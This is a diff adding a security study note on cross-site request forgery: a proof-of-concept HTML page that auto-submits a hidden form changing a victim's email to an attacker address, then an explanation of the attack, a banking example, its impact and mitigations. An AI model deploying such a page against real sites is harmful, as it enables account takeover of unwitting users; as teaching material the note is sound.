@@ -1,0 +1,53 @@
+CSRF
+(without burpsuite)
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CSRF Attack</title>
+</head>
+<body>
+<h2>Click the Button to Perform CSRF Attack</h2>
+<form id="csrfForm" action="http://targetwebsite.com/settings" method="post">
+  <input type="hidden" name="action" value="change_email">
+  <input type="hidden" name="new_email" value="attacker@example.com">
+  <input type="submit" value="Change Email">
+</form>
+<script>
+  // Automatically submit the form when the page loads
+  document.getElementById('csrfForm').submit();
+</script>
+</body>
+</html>
+
+theory:
+Cross-Site Request Forgery (CSRF) is a type of security vulnerability that allows an attacker to execute unauthorized actions on behalf of a victim user in a web application. CSRF attacks typically target state-changing requests, such as changing account settings, making purchases, or submitting forms, that require authentication.
+
+Here's an explanation of how CSRF attacks work and their impact:
+
+1. **Attack Process**:
+   - The attacker crafts a malicious webpage or script containing a request that performs a state-changing action on the target web application.
+   - The attacker tricks the victim into visiting the malicious page. This can be achieved through social engineering tactics such as phishing emails, malicious links, or injecting the payload into legitimate websites.
+   - When the victim's browser loads the malicious page, it automatically executes the attacker's request, often without the victim's knowledge or consent.
+   - Since the victim is authenticated in the web application (e.g., logged in), the server processes the malicious request as if it originated from the legitimate user.
+
+2. **Example Scenario**:
+   - Consider an online banking application that allows users to transfer funds between accounts.
+   - An attacker crafts a malicious webpage containing a hidden form that submits a funds transfer request to the bank's server, transferring funds from the victim's account to the attacker's account.
+   - The attacker tricks the victim into visiting the malicious page, for example, by sending a phishing email containing a link to the page.
+   - When the victim's browser loads the malicious page, it automatically submits the funds transfer request to the bank's server, transferring funds from the victim's account to the attacker's account.
+
+3. **Impact**:
+   - CSRF attacks can have serious consequences, including unauthorized financial transactions, data leakage, account takeover, and manipulation of user settings.
+   - The impact of a CSRF attack depends on the actions that the target web application allows users to perform and the level of access granted to authenticated users.
+
+4. **Mitigation**:
+   - To mitigate CSRF attacks, web developers can implement various defensive measures, including:
+     - Using anti-CSRF tokens: Generating unique tokens for each user session and including them in forms or requests to validate the origin of the request.
+     - Implementing SameSite cookies: Setting the SameSite attribute on cookies to prevent cross-origin requests from sending cookies automatically.
+     - Employing Referer validation: Verifying the Referer header of incoming requests to ensure they originate from the same domain.
+     - Using custom headers: Including custom headers in requests and validating them on the server side to confirm the request's legitimacy.
+
+CSRF attacks pose a significant threat to web application security, highlighting the importance of implementing proper defenses to protect against them. Developers and application owners should conduct regular security assessments and implement best practices to mitigate the risk of CSRF vulnerabilities.
